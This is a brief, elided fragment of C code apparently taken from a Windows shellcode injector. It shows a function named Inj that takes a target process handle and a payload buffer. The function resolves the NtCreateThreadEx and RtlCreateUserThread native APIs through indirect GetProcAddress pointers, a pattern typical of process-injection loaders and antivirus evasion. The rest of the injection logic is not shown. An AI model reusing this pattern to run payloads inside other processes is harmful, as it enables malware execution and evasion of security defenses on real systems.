...
int Inj(HANDLE hProc, unsigned char * payl, unsigned int payl_len) {
		...
		// UNCOMMENT HERE FOR THE FUNCTION TO USE
		//RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) pGetProcAddress(pGetModuleHandleA("NTDLL.DLL"), "RtlCreateUserThread");
		NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t) pGetProcAddress(pGetModuleHandleA("NTDLL.DLL"), "NtCreateThreadEx");
